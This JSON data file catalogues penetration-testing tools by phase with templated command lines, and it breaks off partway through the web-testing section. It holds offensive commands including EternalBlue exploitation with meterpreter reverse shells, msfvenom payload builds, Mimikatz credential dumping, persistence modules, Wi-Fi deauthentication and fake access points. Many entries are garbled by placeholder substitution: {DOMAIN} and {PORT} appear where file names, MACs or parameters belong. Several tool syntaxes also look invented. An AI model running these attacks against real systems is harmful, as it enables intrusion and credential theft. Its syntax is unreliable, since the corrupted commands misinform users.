{
    "Reconnaissance": {
        "tools": [
            "Nmap",
            "theHarvester",
            "Maltego",
            "Recon-ng",
            "Dnsenum",
            "Shodan",
            "OSINT Framework",
            "SpiderFoot",
            "FOCA",
            "Netdiscover",
            "WhatWeb",
            "Amass",
            "Sublist3r",
            "Sherlock",
            "Censys"
        ],
        "commands": {
            "Nmap": [
                "nmap -T4 -A -v {TARGET_IP}",
                "nmap -sS -sV -O -p- {TARGET_SUBNET}",
                "nmap -Pn -sU -A -v {TARGET_SUBNET}"
            ],
            "theHarvester": [
                "theHarvester -d {DOMAIN} -l {PORT} -b google",
                "theHarvester -d {DOMAIN} -l {PORT} -b bing",
                "theHarvester -d {DOMAIN} -l {PORT} -b linkedin"
            ],
            "Maltego": [
                "maltego -t all -d {DOMAIN}",
                "maltego -x -t email -d {USERNAME}@{DOMAIN}",
                "maltego -i -t social -d {DOMAIN}"
            ],
            "Recon-ng": [
                "recon-ng -w workspaces create example",
                "recon-ng -w example modules load recon/domains-hosts/google_site_web",
                "recon-ng -w example modules run recon/domains-hosts/google_site_web"
            ],
            "Dnsenum": [
                "dnsenum --enum --threads={PORT} {DOMAIN}",
                "dnsenum --google --threads={PORT} {DOMAIN}",
                "dnsenum --no-whois --threads={PORT} {DOMAIN}"
            ],
            "Shodan": [
                "shodan host {TARGET_IP}",
                "shodan search 'apache' --limit {PORT}",
                "shodan scan submit {DOMAIN}"
            ],
            "OSINT Framework": [
                "osint-framework --search 'social media'",
                "osint-framework --scan 'public databases'",
                "osint-framework --analyze 'network infrastructure'"
            ],
            "SpiderFoot": [
                "spiderfoot -s {DOMAIN} -o spiderfoot_report.html",
                "spiderfoot -s {TARGET_SUBNET} -c config/sf_config.py",
                "spiderfoot -s {DOMAIN} -t all -o spiderfoot_full.json"
            ],
            "FOCA": [
                "foca -url http://{DOMAIN} -out {DOMAIN}",
                "foca -dir /var/www/html -out foca_report.html",
                "foca -e http://{DOMAIN} -f docx -o foca_docx_report.docx"
            ],
            "Netdiscover": [
                "netdiscover -r {TARGET_SUBNET} -P",
                "netdiscover -i {INTERFACE} -r {TARGET_SUBNET}",
                "netdiscover -r {TARGET_SUBNET} -p"
            ],
            "WhatWeb": [
                "whatweb -v -a {PORT} http://{DOMAIN}",
                "whatweb --log-verbose=whatweb_log.txt http://{DOMAIN}",
                "whatweb --identify-all -v http://{DOMAIN}"
            ],
            "Amass": [
                "amass enum -d {DOMAIN} -o amass_domains.txt",
                "amass enum -active -d {DOMAIN} -o amass_active.txt",
                "amass intel -whois -d {DOMAIN} -o amass_intel.json"
            ],
            "Sublist3r": [
                "sublist3r -d {DOMAIN} -o {DOMAIN}",
                "sublist3r -d {DOMAIN} -b google,bing -o subdomains_full.txt",
                "sublist3r -d {DOMAIN} -t {PORT} -o subdomains_threaded.txt"
            ],
            "Sherlock": [
                "sherlock -i -t twitter -d /path/to/directory",
                "sherlock --full",
                "sherlock -d example_usernames.txt"
            ],
            "Censys": [
                "censys search --query 'services.service_name: HTTP' --fields ip,location",
                "censys scan submit {DOMAIN}",
                "censys scan list"
            ]
        }
    },
    "Scanning and Enumeration": {
        "tools": [
            "Nessus",
            "OpenVAS",
            "Nikto",
            "Masscan",
            "Gobuster",
            "DirBuster",
            "SSLScan",
            "Enum4linux",
            "SNMPwalk",
            "Ldapsearch",
            "Fierce",
            "Netcat",
            "Angry IP Scanner",
            "Zmap",
            "Hping3"
        ],
        "commands": {
            "Nessus": [
                "nessus -q -x -T html -o {DOMAIN} -i scan_template.nessus",
                "nessus -q -x -T csv -o {DOMAIN} -i scan_template.nessus",
                "nessus -q -x -T nessus -o {DOMAIN} -i scan_template.nessus"
            ],
            "OpenVAS": [
                "openvas-start",
                "omp -u {USERNAME} -w {PASSWORD} -T",
                "omp -u {USERNAME} -w {PASSWORD} --create-target --name \"Target1\" --hosts {TARGET_IP}"
            ],
            "Nikto": [
                "nikto -h http://{DOMAIN} -p {PORT},{PORT} -Display V -output nikto_report.html",
                "nikto -h http://{DOMAIN} -C all -Plugins \"fast,joomla\" -output nikto_report.txt",
                "nikto -h https://{DOMAIN} -ssl -id USER:PASS -output nikto_report.xml"
            ],
            "Masscan": [
                "masscan {TARGET_SUBNET} -p0-{PORT} --rate={PORT} -oG masscan_scan.gnmap",
                "masscan {DOMAIN} -p80,{PORT},{PORT} --rate={PORT} -oX masscan_scan.xml",
                "masscan {TARGET_SUBNET} -p1-{PORT} --rate={PORT} -oL masscan_scan.lst"
            ],
            "Gobuster": [
                "gobuster dir -u http://{DOMAIN} -w /usr/share/wordlists/dirbuster/{DOMAIN} -t {PORT} -o gobuster_dir.txt",
                "gobuster dns -d {DOMAIN} -w /usr/share/wordlists/dns/{DOMAIN} -t {PORT} -o gobuster_dns.txt",
                "gobuster vhost -u http://{DOMAIN} -w /usr/share/wordlists/{DOMAIN} -t {PORT} -o gobuster_vhost.txt"
            ],
            "DirBuster": [
                "dirbuster -u http://{DOMAIN} -l /usr/share/dirbuster/wordlists/{DOMAIN} -t {PORT} -x php,html,txt -o dirbuster_report.txt",
                "dirbuster -u http://{DOMAIN} -l /usr/share/dirbuster/wordlists/{DOMAIN} -t {PORT} -x aspx,js -o dirbuster_report_small.txt",
                "dirbuster -u http://{DOMAIN} -l /usr/share/dirbuster/wordlists/{DOMAIN} -t {PORT} -x jsp,py -o dirbuster_report_large.txt"
            ],
            "SSLScan": [
                "sslscan {DOMAIN}",
                "sslscan --no-colour --no-failed {DOMAIN} > sslscan_report.txt",
                "sslscan --parallel={PORT} {DOMAIN}"
            ],
            "Enum4linux": [
                "enum4linux -a {TARGET_IP}",
                "enum4linux -U -P -o enum_output.txt {TARGET_IP}",
                "enum4linux -S -o enum_secure.txt {TARGET_IP}"
            ],
            "SNMPwalk": [
                "snmpwalk -v2c -c public {TARGET_IP}",
                "snmpwalk -v1 -c private {TARGET_IP}",
                "snmpwalk -v3 -u {USERNAME} -a MD5 -A authpass -x DES -X privpass {TARGET_IP}"
            ],
            "Ldapsearch": [
                "ldapsearch -x -H ldap://{DOMAIN} -b \"{LDAP_BASE_DN}\"",
                "ldapsearch -x -D \"cn={USERNAME},{LDAP_BASE_DN}\" -w {PASSWORD} -b \"{LDAP_BASE_DN}\"",
                "ldapsearch -x -LLL -H ldap://{TARGET_IP} -b \"ou=users,{LDAP_BASE_DN}\" {USER_DN}"
            ],
            "Fierce": [
                "fierce -dns {DOMAIN}",
                "fierce --domain {DOMAIN} --threads {PORT}",
                "fierce -dns {DOMAIN} -threads {PORT} -output fierce_report.txt"
            ],
            "Netcat": [
                "nc -zv {TARGET_IP} {PORT}-{PORT}",
                "nc -v -w {PORT} {DOMAIN} {PORT}",
                "nc -vn -z {TARGET_SUBNET} {PORT}"
            ],
            "Angry IP Scanner": [
                "ipscan {TARGET_SUBNET} -p {PORT}-{PORT} -o angry_scan.csv",
                "ipscan {DOMAIN} -p {PORT},{PORT} -o angry_scan.xml",
                "ipscan {TARGET_SUBNET} -p {PORT},{PORT},{PORT} -o angry_full_scan.txt"
            ],
            "Zmap": [
                "zmap -p {PORT} -o zmap_output.csv {TARGET_SUBNET}",
                "zmap -B 10M -p {PORT} -o zmap_scan.xml {DOMAIN}",
                "zmap -p {PORT},{PORT},{PORT} -o zmap_ports.txt {TARGET_SUBNET}"
            ],
            "Hping3": [
                "hping3 -S -p {PORT} -c {PORT} {DOMAIN}",
                "hping3 -A -p {PORT} -c {PORT} {TARGET_IP}",
                "hping3 --flood -p {PORT} -S {TARGET_IP}"
            ]
        }
    },
    "Vulnerability Analysis": {
        "tools": [
            "Burp Suite",
            "SQLmap",
            "Wapiti",
            "Arachni",
            "Skipfish",
            "Vega",
            "Nexpose",
            "Qualys",
            "OpenSCAP",
            "VulnHub",
            "Vuls",
            "{DOMAIN}",
            "RIPS"
        ],
        "commands": {
            "Burp Suite": [
                "java -jar {DOMAIN} -{DOMAIN}=true -Xmx2G",
                "burpsuite -Xmx4G -t http://{DOMAIN}",
                "burpsuite -P /path/to/{DOMAIN} -o burp_report.html"
            ],
            "SQLmap": [
                "sqlmap -u \"http://{DOMAIN}/{DOMAIN}?id={PORT}\" --risk={PORT} --level={PORT} --batch",
                "sqlmap -u \"http://{DOMAIN}/{DOMAIN}?id={PORT}\" --dbs --threads={PORT}",
                "sqlmap -u \"http://{DOMAIN}/{DOMAIN}?id={PORT}\" --dump --threads={PORT}"
            ],
            "Wapiti": [
                "wapiti http://{DOMAIN} -f html -o wapiti_report.html",
                "wapiti http://{DOMAIN} -m xss,sql --scope medium -o wapiti_xss_sql.json",
                "wapiti http://{DOMAIN} -l DEBUG -o wapiti_debug.log"
            ],
            "Arachni": [
                "arachni http://{DOMAIN} --output-only-positives --report-save-path arachni_report.afr",
                "arachni http://{DOMAIN} --checks xss,sql_injection --output-format json",
                "arachni http://{DOMAIN} --scope-exclude-paths '/{USERNAME}/*' --report-save-path arachni_exclude.afr"
            ],
            "Skipfish": [
                "skipfish -o skipfish_output http://{DOMAIN}",
                "skipfish -S /usr/share/skipfish/dictionaries/{DOMAIN} -o skipfish_custom http://{DOMAIN}",
                "skipfish -T {PORT} -o skipfish_fast http://{DOMAIN}"
            ],
            "Vega": [
                "vega -u http://{DOMAIN} -o vega_report.html",
                "vega --scan http://{DOMAIN} --output vega_scan.xml",
                "vega -f json -u http://{DOMAIN} -o vega_json_report.json"
            ],
            "Nexpose": [
                "nexposeconsole -r scan_template.nse -t {TARGET_IP} -o nexpose_report.html",
                "nexposeconsole -x -f csv -o nexpose_report.csv -t {DOMAIN}",
                "nexposeconsole -s start_scan -t {TARGET_IP} -o nexpose_start.log"
            ],
            "Qualys": [
                "qualysscanner -u {USERNAME} -p {PASSWORD} -s -T scan_template.xml -o qualys_report.html",
                "qualysscanner -u {USERNAME} -p {PASSWORD} --start-scan -d {DOMAIN}",
                "qualysscanner --login {USERNAME} --{PASSWORD} {PASSWORD} --scan {DOMAIN} --format xml"
            ],
            "OpenSCAP": [
                "oscap oval eval --results {DOMAIN} --report {DOMAIN} /usr/share/xml/scap/ssg/content/{DOMAIN}",
                "oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_standard --results {DOMAIN} --report {DOMAIN} example_com.xml",
                "oscap oval eval --fetch-remote-resources --results {DOMAIN} --report {DOMAIN} /path/to/your_policy.xml"
            ],
            "VulnHub": [
                "vulnhub --download VulnHub_VM.iso",
                "vulnhub --import VulnHub_VM.iso",
                "vulnhub --scan -i VulnHub_VM.iso -o vuln_scan_report.txt"
            ],
            "Vuls": [
                "vuls scan -config /etc/vuls/{DOMAIN}",
                "vuls report -format json -o vuls_report.json",
                "vuls report -format html -o vuls_report.html"
            ],
            "Retire.js": [
                "retire -q --path /var/www/html -o retire_report.json",
                "retire --remote --outputformat json > retire_remote.json",
                "retire --scanurls https://{DOMAIN} --output retire_scan.html"
            ],
            "RIPS": [
                "rips -f /path/to/source/code -o rips_report.html",
                "rips --scan /var/www/html -f json -o rips_scan.json",
                "rips -f /path/to/source/code -t {PORT} -o rips_multithread.html"
            ]
        }
    },
    "Exploitation": {
        "tools": [
            "Metasploit Framework",
            "BeEF (Browser Exploitation Framework)",
            "Cobalt Strike",
            "ExploitDB",
            "Canvas",
            "Core Impact",
            "SET (Social-Engineer Toolkit)",
            "Armitage",
            "PowerSploit",
            "EvilAP",
            "Responder",
            "Empire",
            "MSFvenom"
        ],
        "commands": {
            "Metasploit Framework": [
                "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {TARGET_IP}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {TARGET_IP}; exploit'",
                "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={TARGET_IP} LPORT={PORT} -f elf > {DOMAIN}",
                "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {TARGET_IP}; exploit'"
            ],
            "BeEF (Browser Exploitation Framework)": [
                "beef -x -c /usr/share/beef-xss/{DOMAIN}",
                "beef -c /etc/beef/{DOMAIN} -d",
                "beef -c /path/to/custom/{DOMAIN} -v"
            ],
            "Cobalt Strike": [
                "cobaltstrike -c beacon_payload.cna -f {DOMAIN} -o beacon_output",
                "cobaltstrike -p server_payload.ps1 -o server_output",
                "cobaltstrike -t teamserver_address -u {USERNAME} -p {PASSWORD}"
            ],
            "ExploitDB": [
                "searchsploit -t windows {PORT} -c",
                "searchsploit -m linux apache",
                "searchsploit -w vulnerability 'remote code execution'"
            ],
            "Canvas": [
                "canvas -r exploit_canvas.xml -t {TARGET_IP} -p {PORT}",
                "canvas -r remote_exec.xml -t {DOMAIN} -p {PORT}",
                "canvas -r smb_exploit.xml -t {TARGET_IP} -p {PORT}"
            ],
            "Core Impact": [
                "coreimpact -launch -target {TARGET_IP} -module smb_exploit",
                "coreimpact -scan -target {DOMAIN} -module web_vuln",
                "coreimpact -execute -target {TARGET_IP} -module sql_injection"
            ],
            "SET (Social-Engineer Toolkit)": [
                "setoolkit -t spearphishing -i email@{DOMAIN} -o {DOMAIN}",
                "setoolkit -t website_attack -u http://{DOMAIN} -o beef_hook.js",
                "setoolkit -t credential_harvester -p http://{DOMAIN}/login -o {DOMAIN}"
            ],
            "Armitage": [
                "armitage -import -x 'load /path/to/{DOMAIN}'",
                "armitage -c 'use exploit/windows/misc/ms17_010_eternalblue; set RHOSTS {TARGET_IP}; exploit'",
                "armitage -c 'run post/windows/gather/hashdump'"
            ],
            "PowerSploit": [
                "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'",
                "Invoke-ReflectivePEInjection -PEPath C:\\path\\to\\{DOMAIN}",
                "Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost {TARGET_IP} -Lport {PORT}"
            ],
            "EvilAP": [
                "evilap -i {INTERFACE} -e \"FakeAP\" -c {PORT} -t {PORT} -o evilap_output.log",
                "evilap --interface {INTERFACE} --essid \"MaliciousAP\" --channel {PORT} --output evilap_report.txt",
                "evilap -i {INTERFACE} --hide --essid \"HiddenAP\" -c {PORT} -o evilap_hidden.log"
            ],
            "Responder": [
                "responder -I {INTERFACE} -wrf",
                "responder -I {INTERFACE} -wrf -v",
                "responder -I {INTERFACE} -wrf -g"
            ],
            "Empire": [
                "usemodule persistence/windows/registry; set AgentName agent1; execute",
                "usemodule persistence/macos/plist; set AgentName agent2; execute",
                "usemodule persistence/linux/init.d; set AgentName agent3; execute"
            ],
            "MSFvenom": [
                "msfvenom -p windows/meterpreter/reverse_tcp LHOST={TARGET_IP} LPORT={PORT} -f exe -o {DOMAIN}",
                "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={TARGET_IP} LPORT={PORT} -f elf > {DOMAIN}",
                "msfvenom -p php/meterpreter/reverse_tcp LHOST={TARGET_IP} LPORT={PORT} -f raw > {DOMAIN}"
            ]
        }
    },
    "Post-Exploitation": {
        "tools": [
            "PowerSploit",
            "Empire",
            "Mimikatz",
            "Responder",
            "Veil-Evasion",
            "Meterpreter",
            "PrivescCheck",
            "LaZagne",
            "Invoke-Obfuscation",
            "Ghost Phisher",
            "NetRipper",
            "Keylogger"
        ],
        "commands": {
            "PowerSploit": [
                "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'",
                "Invoke-ReflectivePEInjection -PEPath C:\\path\\to\\{DOMAIN}",
                "Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost {TARGET_IP} -Lport {PORT}"
            ],
            "Empire": [
                "usemodule credentials/mimikatz/logonpasswords",
                "usemodule persistence/windows/registry",
                "usestager windows/launcher_bat"
            ],
            "Mimikatz": [
                "privilege::debug",
                "sekurlsa::logonpasswords",
                "kerberos::ptt {DOMAIN}"
            ],
            "Responder": [
                "responder -I {INTERFACE} -wrf",
                "responder -I {INTERFACE} -wrf -v",
                "responder -I {INTERFACE} -wrf -g"
            ],
            "Veil-Evasion": [
                "veil-evasion -p python/shell_reverse_tcp -o {DOMAIN}",
                "veil-evasion -p windows/meterpreter/reverse_tcp -o {DOMAIN}",
                "veil-evasion -p java/meterpreter/reverse_tcp -o {DOMAIN}"
            ],
            "Meterpreter": [
                "meterpreter > sysinfo",
                "meterpreter > hashdump",
                "meterpreter > shell"
            ],
            "PrivescCheck": [
                "./{DOMAIN}",
                "./{DOMAIN} -o privesc_report.txt",
                "./{DOMAIN} -a all -v"
            ],
            "LaZagne": [
                "{DOMAIN} all",
                "{DOMAIN} browsers",
                "{DOMAIN} --output lazagne_report.txt"
            ],
            "Invoke-Obfuscation": [
                "Invoke-Obfuscation -ScriptBlock (Get-Content payload.ps1 | Out-String)",
                "Invoke-Obfuscation -Command 'Invoke-Mimikatz'",
                "Invoke-Obfuscation -Command 'Get-NetIPAddress'"
            ],
            "Ghost Phisher": [
                "ghost-phisher -m sniffer -o ghost_sniff.pcap",
                "ghost-phisher -m evilap -e \"FakeAP\" -o ghost_evilap.log",
                "ghost-phisher -m wifi -p {INTERFACE} -o ghost_wifi.log"
            ],
            "NetRipper": [
                "netripper -i {INTERFACE} -o netripper_capture.pcap",
                "netripper --interface {INTERFACE} --output netripper_wifi.pcap",
                "netripper -i {INTERFACE} -f netripper_full.pcap"
            ],
            "Keylogger": [
                "keylogger -i {INTERFACE} -o keylog_capture.log",
                "keylogger --interface {INTERFACE} --output keylog_wifi.log",
                "keylogger -d -i {INTERFACE} -o keylog_debug.log"
            ]
        }
    },
    "Reporting": {
        "tools": [
            "Dradis",
            "MagicTree",
            "Faraday",
            "Serpico",
            "CaseFile",
            "Metasploit Pro",
            "Burp Suite Professional",
            "MantisBT",
            "KeepNote",
            "Seas0nPass",
            "Pico",
            "Vega Report"
        ],
        "commands": {
            "Dradis": [
                "dradis -c config/{DOMAIN}",
                "dradis -i import/{DOMAIN}",
                "dradis -e export/{DOMAIN}"
            ],
            "MagicTree": [
                "magictree --import {DOMAIN}",
                "magictree --generate {DOMAIN}",
                "magictree --export {DOMAIN}"
            ],
            "Faraday": [
                "faraday-server -d /path/to/data",
                "faraday-client -c connect -h {TARGET_IP}",
                "faraday-cli export -f {DOMAIN}"
            ],
            "Serpico": [
                "serpico -i import_scan.xml",
                "serpico -g generate_report -t pdf",
                "serpico -e export_findings.json"
            ],
            "CaseFile": [
                "casefile -c create new_case",
                "casefile -a add_findings {DOMAIN}",
                "casefile -r generate_report {DOMAIN}"
            ],
            "Metasploit Pro": [
                "msfpro -c config/{DOMAIN}",
                "msfpro -l -f project_list.json",
                "msfpro -e -p project1 -o metasploit_report.html"
            ],
            "Burp Suite Professional": [
                "java -jar burpsuite_pro.jar --config-file /path/to/{DOMAIN}",
                "burpsuite_pro -t http://{DOMAIN} -o burp_pro_report.html",
                "burpsuite_pro -d /path/to/project -o burp_pro_export.xml"
            ],
            "MantisBT": [
                "mantisbt -c config/{DOMAIN}",
                "mantisbt --import {DOMAIN}",
                "mantisbt --export {DOMAIN}"
            ],
            "KeepNote": [
                "keepnote -i import_notes.knt",
                "keepnote -e export_report.pdf",
                "keepnote -c create new_note.knt"
            ],
            "Seas0nPass": [
                "seas0npass --generate -o seas0npass_payload.bin",
                "seas0npass --convert -i seas0npass_payload.bin -o {DOMAIN}",
                "seas0npass --verify -i {DOMAIN}"
            ],
            "Pico": [
                "pico -i {DOMAIN} -o pico_output.txt",
                "pico --analyze {DOMAIN} -o pico_report.html",
                "pico --scan {DOMAIN} -o pico_scan.txt"
            ],
            "Vega Report": [
                "vega -r scan_report.html",
                "vega --export-json vega_report.json",
                "vega --generate-pdf vega_report.pdf"
            ]
        }
    },
    "Privilege Escalation": {
        "tools": [
            "LinEnum",
            "WinPEAS",
            "PowerUp",
            "Sherlock",
            "BeRoot"
        ],
        "commands": {
            "LinEnum": [
                "./{DOMAIN} -a",
                "./{DOMAIN} -r",
                "./{DOMAIN} -o output_report.txt"
            ],
            "WinPEAS": [
                "{DOMAIN} -c",
                "{DOMAIN} -a",
                "{DOMAIN} -s > winpeas_report.txt"
            ],
            "PowerUp": [
                "Import-Module PowerUp.ps1; Invoke-AllChecks",
                "Import-Module PowerUp.ps1; Invoke-SecurityMisconfigurations",
                "Import-Module PowerUp.ps1; Invoke-VulnerableServices"
            ],
            "Sherlock": [
                "sherlock -i -t",
                "sherlock --full",
                "sherlock -d /path/to/directory"
            ],
            "BeRoot": [
                "./{DOMAIN} --all",
                "./{DOMAIN} --no-color",
                "./{DOMAIN} --verbose"
            ]
        }
    },
    "Password Attacks": {
        "tools": [
            "John the Ripper",
            "Hashcat",
            "Hydra",
            "Medusa",
            "Crunch",
            "CeWL",
            "Patator",
            "RainbowCrack",
            "THC-Password-Cracker",
            "Ophcrack",
            "Cain",
            "Aircrack-ng",
            "WPA/WPA2 Crackers"
        ],
        "commands": {
            "John the Ripper": [
                "john --wordlist=/usr/share/wordlists/{DOMAIN} --rules --fork={PORT} {DOMAIN}",
                "john --incremental=All --format=md5crypt {DOMAIN}",
                "john --mask='?l?l?l?l?d?d' --max-length={PORT} {DOMAIN}"
            ],
            "Hashcat": [
                "hashcat -m {PORT} -a {PORT} -o {DOMAIN} {DOMAIN} /usr/share/wordlists/{DOMAIN}",
                "hashcat -m {PORT} -a {PORT} hashes.sha1 ?d?d?d?d",
                "hashcat -m {PORT} -a {PORT} {DOMAIN} /usr/share/wordlists/{DOMAIN}"
            ],
            "Hydra": [
                "hydra -L {DOMAIN} -P {DOMAIN} ssh://{TARGET_IP}",
                "hydra -s {PORT} -V -L {DOMAIN} -P {DOMAIN} https://{DOMAIN}",
                "hydra -t {PORT} -f -L admin_users.txt -P admin_pass.txt ftp://{TARGET_IP}"
            ],
            "Medusa": [
                "medusa -h {TARGET_IP} -U {DOMAIN} -P {DOMAIN} -M ssh",
                "medusa -h {DOMAIN} -U admin_users.txt -P admin_pass.txt -M http",
                "medusa -h {TARGET_IP} -U list_users.txt -P list_pass.txt -M ftp"
            ],
            "Crunch": [
                "crunch {PORT} {PORT} abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -o {DOMAIN}",
                "crunch {PORT} {PORT} -f /usr/share/crunch/{DOMAIN} numeric -o numeric_wordlist.txt",
                "crunch {PORT} {PORT} -t p@$$w0rd -o fixed_passwords.txt"
            ],
            "CeWL": [
                "cewl http://{DOMAIN} -w ceWL_wordlist.txt",
                "cewl -d {PORT} -m {PORT} -w ceWL_custom.txt http://{DOMAIN}",
                "cewl --with-numbers http://{DOMAIN} -w ceWL_numbers.txt"
            ],
            "Patator": [
                "patator ssh_login host={TARGET_IP} {USERNAME}=FILE0 {PASSWORD}=FILE1 {PORT}={DOMAIN} {PORT}={DOMAIN} -x ignore:mesg='Authentication failure'",
                "patator http_fuzz url=http://{DOMAIN}/{DOMAIN} method=POST body='{USERNAME}=FILE0&{PASSWORD}=FILE1' {PORT}={DOMAIN} {PORT}={DOMAIN} -x ignore:code={PORT}",
                "patator ftp_login host={TARGET_IP} {USERNAME}=FILE0 {PASSWORD}=FILE1 {PORT}={DOMAIN} {PORT}={DOMAIN} -x ignore:mesg='Login incorrect'"
            ],
            "RainbowCrack": [
                "rcrack . -f {DOMAIN} -o rainbow_crack_results.txt",
                "rcrack /path/to/rainbowtables -f cracked_hashes.txt -o rcrack_output.txt",
                "rcrack /rainbowtables -f target_hashes.txt -o cracked_passwords.txt"
            ],
            "THC-Password-Cracker": [
                "thc-pcrack -f {DOMAIN} -u {DOMAIN} -d /usr/share/wordlists/{DOMAIN}",
                "thc-pcrack -f target_hashes.pwd -u admin_users.txt -d admin_wordlist.txt",
                "thc-pcrack -f smb_hashes.pwd -u smb_users.txt -d smb_wordlist.txt"
            ],
            "Ophcrack": [
                "ophcrack-cli -a /path/to/{DOMAIN} -o /output/path/ophcrack_result.txt -f {DOMAIN}",
                "ophcrack-cli --crack /path/to/{DOMAIN} --output /output/ophcrack_report.html",
                "ophcrack-cli -w /path/to/{DOMAIN} -f /path/to/{DOMAIN} -o /output/ophcrack_custom.txt"
            ],
            "Cain": [
                "cain --crack --hashes={DOMAIN} --wordlist={DOMAIN}",
                "cain --crack --hash-type=MD5 --hashes=md5_hashes.txt --wordlist=custom_wordlist.txt",
                "cain --crack --hashes=sha1_hashes.txt --wordlist={DOMAIN} --output=cain_results.txt"
            ],
            "Aircrack-ng": [
                "aircrack-ng -w /usr/share/wordlists/{DOMAIN} -b AA:BB:CC:DD:EE:FF {DOMAIN}",
                "aircrack-ng -a2 -w custom_wordlist.txt -b {PORT}:{PORT}:{PORT}:{PORT}:{PORT}:{PORT} {DOMAIN}",
                "aircrack-ng -a WPA2 -w /path/to/{DOMAIN} -b {PORT}:{PORT}:{PORT}:{PORT}:{PORT}:{PORT} {DOMAIN}"
            ],
            "WPA/WPA2 Crackers": [
                "wpa_supplicant -B -i {INTERFACE} -c /path/to/{DOMAIN}",
                "wpa_cli -i {INTERFACE} reconfigure",
                "wpa_cli -i {INTERFACE} disconnect"
            ]
        }
    },
    "Wireless Attacks": {
        "tools": [
            "Aircrack-ng",
            "Reaver",
            "Wifite",
            "Fern WiFi Cracker",
            "Kismet",
            "Wireshark",
            "Bettercap",
            "MDK3",
            "Cowpatty",
            "Fern",
            "NetStumbler",
            "Airgeddon",
            "Wifiphisher"
        ],
        "commands": {
            "Aircrack-ng": [
                "airmon-ng start {INTERFACE}",
                "airodump-ng wlan0mon",
                "aireplay-ng --deauth {PORT} -a AA:BB:CC:DD:EE:FF wlan0mon",
                "aircrack-ng -w /usr/share/wordlists/{DOMAIN} -b AA:BB:CC:DD:EE:FF {DOMAIN}"
            ],
            "Reaver": [
                "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv",
                "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c {PORT} -L -N",
                "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d {PORT} -S -W"
            ],
            "Wifite": [
                "wifite -i {INTERFACE} -p {PORT} -b AA:BB:CC:DD:EE:FF",
                "wifite --attack wps --encrypt WPA2",
                "wifite --bssid AA:BB:CC:DD:EE:FF --timeout {PORT}"
            ],
            "Fern WiFi Cracker": [
                "fern-wifi-cracker",
                "fern --start --interface {INTERFACE} --essid \"FakeAP\" --output fern_report.html",
                "fern --scan --interface {INTERFACE} -o fern_scan.json"
            ],
            "Kismet": [
                "kismet -c {INTERFACE}",
                "kismet -c wlan0mon -o kismet_output.kismet",
                "kismet --enable-protocols={PORT}.{PORT},{PORT}.11a -c {INTERFACE}"
            ],
            "Wireshark": [
                "wireshark -i wlan0mon -k",
                "wireshark -r {DOMAIN}",
                "wireshark -Y \"{DOMAIN}\" -i wlan0mon -w http_requests.pcap"
            ],
            "Bettercap": [
                "bettercap -iface wlan0mon -eval \"{DOMAIN} on; {DOMAIN} on; {DOMAIN} on\"",
                "bettercap -iface wlan0mon -X",
                "bettercap -iface wlan0mon --sniffer off --proxy off"
            ],
            "MDK3": [
                "mdk3 wlan0mon m",
                "mdk3 wlan0mon d -c {PORT}",
                "mdk3 wlan0mon a -c {PORT} -n \"FakeAP\""
            ],
            "Cowpatty": [
                "cowpatty -r /path/to/{DOMAIN} -w /usr/share/wordlists/{DOMAIN}",
                "cowpatty -r {DOMAIN} -s \"ExampleSSID\" -o cowpatty_output.txt",
                "cowpatty -c -r {DOMAIN} -w custom_wordlist.txt -s ExampleSSID"
            ],
            "Fern": [
                "fern",
                "fern --start --interface {INTERFACE} --essid \"FakeAP\" --output fern_scan.json",
                "fern --scan --interface {INTERFACE} -o fern_report.html"
            ],
            "NetStumbler": [
                "netstumbler -c",
                "netstumbler --scan --output netstumbler_results.csv",
                "netstumbler -i {INTERFACE} -o netstumbler_output.txt"
            ],
            "Airgeddon": [
                "airgeddon",
                "airgeddon -i {INTERFACE} -a AA:BB:CC:DD:EE:FF -e \"EvilAP\"",
                "airgeddon --attack wps -i wlan0mon -b AA:BB:CC:DD:EE:FF"
            ],
            "Wifiphisher": [
                "wifiphisher",
                "wifiphisher -a {PORT} -c {PORT} -e \"FakeAP\" -o wifiphisher_log.txt",
                "wifiphisher --preshared-key \"{PASSWORD}\" --output wifiphisher_output.html"
            ]
        }
    },
    "Web Application Testing": {
        "tools": [
            "OWASP ZAP (Zed Attack Proxy)",
            "Burp Suite",
            "W3af",
            "Skipfish",
            "Vega",
            "Nikto",
            "SQLmap",
            "Arachni",
            "BeEF",
            "DirBuster",
            "Gobuster",
            "XSStrike",
            "Intruder",
            "IronWASP"
        ],
        "commands": {
            "OWASP ZAP (Zed Attack Proxy)": [
                "{DOMAIN} -daemon -port {PORT} -config {DOMAIN}=123456",
                "zap-cli quick-scan -r http://{DOMAIN}",
                "zap-cli active-scan -r http://{DOMAIN} -s xss,sql_injection"
            ],
            "Burp Suite": [
                "java -jar {DOMAIN} -{DOMAIN}=true -Xmx2G",
                "burpsuite -Xmx4G -t http://{DOMAIN}",
                "burpsuite -P /path/to/{DOMAIN} -o burp_report.html"
            ],
            "W3af": [
                "w3af_console -s /path/to/w3af_script.w3af",
                "w3af_console -i scan_list.txt -o w3af_output.log",
                "w3af_console -t http://{DOMAIN} -o w3af_report.html"
            ],
            "Skipfish": [
                "skipfish -o skipfish_output http://{DOMAIN}",
                "skipfish -S /usr/share/skipfish/dictionaries/{DOMAIN} -o skipfish_custom http://{DOMAIN}",
                "skipfish -T {PORT} -o skipfish_fast http://{DOMAIN}"
            ],
            "Vega": [
                "vega -u http://{DOMAIN} -o vega_report.html",
                "vega --scan http://{DOMAIN} --output vega_scan.xml",
                "vega -f json -u http://{DOMAIN} -o vega_json_report.json"
            ],
            "Nikto": [
                "nikto -h http://{DOMAIN} -p {PORT},{PORT} -Display V -output nikto_report.html",
                "nikto -h http://{DOMAIN} -C all -Plugins \"fast,joomla\" -output nikto_report.txt",
